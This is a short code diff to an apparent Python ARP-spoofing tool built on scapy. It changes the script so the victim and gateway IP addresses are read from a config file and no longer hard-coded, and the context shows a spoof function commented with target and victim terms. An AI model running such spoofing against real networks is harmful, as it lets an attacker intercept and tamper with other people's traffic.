@@ -6,6 +6,10 @@
 import scapy.all as scapy
 import time
 
+from configparser import ConfigParser
+parser = ConfigParser()
+parser.read('config.ini')
+
 def spoof(target_ip, spoof_ip):
     # op=1 = Request, op=2 = Response
     # pdst = IP of target/victim computer
@@ -32,8 +36,8 @@ def get_mac(ip):
 
     return answered_list[0][1].hwsrc
 
-target_ip = '1.2.100.141'
-gateway_ip = '1.2.100.1'
+target_ip = str(parser.get('spoof', 'target'))
+gateway_ip = str(parser.get('spoof', 'gateway'))
 
 sent_packets_count = 0
 try:
